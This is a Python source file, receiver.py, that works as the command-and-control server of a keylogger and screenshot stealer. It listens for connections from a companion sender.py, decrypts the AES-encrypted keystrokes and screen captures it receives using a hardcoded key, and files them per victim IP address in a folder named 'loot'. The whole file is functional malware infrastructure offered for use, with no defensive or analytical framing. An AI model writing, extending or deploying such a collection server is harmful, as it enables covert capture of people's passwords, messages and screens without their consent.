#!/usr/bin/python3

# ─── RECEIVER.PY ─────────────────────────────────────────────────────────────────────
# This script acts as a server that receives encrypted keyboard inputs and screenshots
# from client machines (sender.py). It decrypts the data and saves it to files.
# ─────────────────────────────────────────────────────────────────────────────────────

import socket
import threading
import time
import os
import base64
import struct
from datetime import datetime
from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad


# ─── CONFIGURATION SETTINGS ────────────────────────────────────────────────────────────────────────────────
SECRET_KEY    = b'w\xd7\xc9=0\x17\xd1{\xe3\xc7{\x1a"\x8d\xa7\xb19\x87e\xb7gTQ\x98R\xed\xf2\x90\xbc\xfb2\xd2'
IV            = b'\xed>\x86\x98\xed\xe5%\x99\x91\xe9r\x8b\t\xe3\xf2\xd2'
HOST, PORT    = '0.0.0.0', 43558
LOOT_DIR      = 'loot'
WRITE_INTERVAL= 10
# ───────────────────────────────────────────────────────────────────────────────────────────────────────────

# Global variables to manage received data and program state
buffers = {}  # Stores keystroke data per client IP until written to disk
lock    = threading.Lock()  # Ensures thread-safe access to shared resources
stop_ev = threading.Event()  # Signal to tell threads when to stop


def timestamp():
    """
    Returns current date and time in a standardized format.
    :return: Current timestamp in 'YYYY-MM-DD HH:MM:SS' format
    """
    return datetime.now().strftime('%Y-%m-%d %H:%M:%S')


def decrypt_data(b64cipher: bytes):
    """
    Decrypts base64-encoded AES encrypted data.
    :param b64cipher: Base64 encoded encrypted data
    :return: The decrypted plaintext message
    :raises: Various decryption errors if the data is corrupted or keys don't match
    """
    cipher = AES.new(SECRET_KEY, AES.MODE_CBC, IV)
    raw = cipher.decrypt(base64.b64decode(b64cipher))
    return unpad(raw, AES.block_size).decode()


def periodic_writer():
    """
    Background thread that periodically writes buffered keystrokes to disk.
    Runs every WRITE_INTERVAL seconds while the program is active.
    Writes all buffered keystrokes to files in the LOOT_DIR directory.
    """
    while not stop_ev.is_set():
        time.sleep(WRITE_INTERVAL)
        with lock:  # Lock ensures no other thread modifies buffers while writing
            for ip, buf in buffers.items():
                if buf:  # Only write if there's actually data
                    path = os.path.join(LOOT_DIR, f"{ip}.txt")
                    with open(path, 'a', encoding='utf-8') as f:
                        f.write(''.join(buf))  # Write all buffered keystrokes
                    buf.clear()  # Empty the buffer after writing


def recv_exact(conn, n):
    """
    Receives exactly n bytes from a network connection.
    :param conn: The active network connection
    :param n: Number of bytes to receive
    :return: The received data
    :raises: ConnectionError: If connection closes before receiving all data
    """
    data = b''
    while len(data) < n:
        chunk = conn.recv(n - len(data))
        if not chunk:
            raise ConnectionError("Connection closed while receiving data")
        data += chunk
    return data


def handle_connection(conn, addr):
    """
    Handles an incoming client connection.
    :param conn: The socket connection object
    :param addr: Tuple containing client's (IP address, port)
    """
    ip = addr[0]
    img_dir = os.path.join(LOOT_DIR, ip)
    os.makedirs(img_dir, exist_ok=True)  # Create directory for this client's screenshots

    try:
        while True:
            try:
                # First read the message length (4 bytes, big-endian)
                raw_len = recv_exact(conn, 4)
                msg_len = struct.unpack('>I', raw_len)[0]

                # Then read the actual encrypted message
                data = recv_exact(conn, msg_len)

                try:
                    text = decrypt_data(data)  # Decrypt the received data
                except Exception as e:
                    print(f"[!] {timestamp()} : Decrypt error from {ip}: {e}")
                    continue

                if text.startswith("IMG|"):
                    # Handle screenshot data
                    _, ts, b64 = text.split('|', 2)
                    img_bytes = base64.b64decode(b64)
                    filename = f"screenshot_{ts.replace(':', '-')}.jpg"
                    with open(os.path.join(img_dir, filename), 'wb') as img_file:
                        img_file.write(img_bytes)
                    print(f"[+] {timestamp()} : Saved image to loot/{ip}/{filename}")
                else:
                    # Handle regular keystroke data
                    with lock:
                        buffers.setdefault(ip, []).append(text)
                    print(f"[+] {timestamp()} : Saved keystrokes to loot/{ip}.txt")
            except ConnectionError:
                break  # Client disconnected
    finally:
        conn.close()  # Ensure connection is closed when done


def main():
    """Main program entry point. Sets up the server and handles connections."""
    if not os.path.exists(LOOT_DIR):
        os.makedirs(LOOT_DIR)  # Create loot directory if it doesn't exist

    # Start the background thread that periodically writes data to disk
    writer = threading.Thread(target=periodic_writer, daemon=True)
    writer.start()

    # Set up the network server
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)  # Allow port reuse
        s.bind((HOST, PORT))  # Bind to the configured host and port
        s.listen()  # Start listening for connections
        print(f"[*] {timestamp()} : Listening on {HOST}:{PORT}")

        try:
            while not stop_ev.is_set():
                conn, addr = s.accept()  # Wait for new connection
                print(f"[+] {timestamp()} : Connection from {addr}")
                # Start new thread to handle this connection
                threading.Thread(target=handle_connection,
                                 args=(conn, addr), daemon=True).start()
        except KeyboardInterrupt:
            print(f"\n[!] {timestamp()} : Shutting down...")
            stop_ev.set()  # Signal threads to stop
            writer.join()  # Wait for writer thread to finish

            # Final write of any remaining buffered data
            with lock:
                for ip, buf in buffers.items():
                    if buf:
                        path = os.path.join(LOOT_DIR, f"{ip}.txt")
                        with open(path, 'a', encoding='utf-8') as f:
                            f.write(''.join(buf))


if __name__ == '__main__':
    main()
